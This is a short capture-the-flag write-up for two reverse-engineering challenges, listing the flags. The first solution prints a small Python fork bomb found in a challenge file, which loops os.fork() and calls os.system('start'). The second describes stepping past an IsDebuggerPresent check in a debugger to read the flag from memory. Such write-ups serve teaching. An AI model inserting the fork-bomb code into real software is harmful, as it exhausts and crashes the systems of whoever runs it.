## Reverse Engineering 100

It's really easy and you don't have to overthink about the depth of this challenge.
just open the "utils.pyc" on the hex editor and you would be able to solve this challenge.

```
http://kchung.co/lol.py

import os
while True:
    try:
        os.fork()
    except:
        os.system('start')
# flag{trust_is_risky}
```

## Reverse Engineering 200

You need Windows to solve this challenge.

First of all, you open rev200 on a debugger and jump over IsDebuggerPresent and set your IP to 010F109B (mov edx, [ebp+lpText]).

After that, you follow the next instruction (sub_10F1000) run it till end of it (this sub_10F100 will do shr/xor and other stuff)

At te end, if you breakpoint on edi at the end of function(i.e. 010F1027 -> pop edi), you can see EDI point of the flag.

```
009607E1 db  66h ; f
009607E2 db  6Ch ; l
009607E3 db  61h ; a
009607E4 db  67h ; g
009607E5 db  7Bh ; {
009607E6 db  72h ; r
009607E7 db  65h ; e
009607E8 db  76h ; v
009607E9 db  65h ; e
009607EA db  72h ; r
009607EB db  73h ; s
009607EC db  69h ; i
009607ED db  6Eh ; n
009607EE db  67h ; g
009607EF db  5Fh ; _
009607F0 db  69h ; i
009607F1 db  73h ; s
009607F2 db  5Fh ; _
009607F3 db  6Eh ; n
009607F4 db  6Fh ; o
009607F5 db  74h ; t
009607F6 db  5Fh ; _
009607F7 db  74h ; t
009607F8 db  68h ; h
009607F9 db  61h ; a
009607FA db  74h ; t
009607FB db  5Fh ; _
009607FC db  68h ; h
009607FD db  61h ; a
009607FE db  72h ; r
009607FF db  64h ; d
00960800 db  21h ; !
00960801 db  7Dh ; }
```